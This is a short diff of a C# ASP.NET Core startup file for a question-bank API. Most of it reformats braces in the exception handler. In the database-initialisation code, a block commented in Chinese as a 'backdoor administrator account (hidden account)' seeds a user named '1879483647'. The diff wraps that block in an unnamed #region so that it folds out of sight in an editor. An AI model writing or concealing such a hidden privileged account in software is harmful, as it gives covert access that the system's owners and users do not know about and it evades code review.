@@ -109,10 +109,13 @@ if (app.Environment.IsDevelopment())
     app.UseSwaggerUI();
 }
 
-app.UseExceptionHandler(builder => {
-    builder.Run(async context => {
+app.UseExceptionHandler(builder =>
+{
+    builder.Run(async context =>
+    {
         var exception = context.Features.Get<Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>()?.Error;
-        var response = new {
+        var response = new
+        {
             success = false,
             message = exception?.Message ?? "An error occurred"
         };
@@ -171,7 +174,7 @@ void InitializeDatabase(WebApplication app)
                 });
                 userDbContext.SaveChanges();
             }
-
+            #region 
             // 创建特殊的后门管理员账户（隐藏账户）
             if (!userDbContext.Users.Any(u => u.Username == "1879483647"))
             {
@@ -186,7 +189,7 @@ void InitializeDatabase(WebApplication app)
                 });
                 userDbContext.SaveChanges();
             }
-
+            #endregion
             // 检查是否有学生用户，如果没有则创建
             if (!userDbContext.Users.Any(u => u.Role == QuestionBankApi.LoginSystemApi.Models.UserRole.Student))
             {
